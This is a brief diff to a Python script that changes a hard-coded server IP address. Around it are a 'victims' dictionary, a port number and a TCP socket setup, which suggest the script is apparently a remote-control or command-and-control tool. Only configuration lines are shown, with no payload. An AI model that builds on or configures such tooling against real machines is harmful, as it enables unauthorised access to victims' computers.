@@ -6,7 +6,7 @@ from sys import executable, argv
 import os
 
 victims = {}
-ip_server = "192.168.43.187"
+ip_server = "10.0.0.23"
 port_server = 1234
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
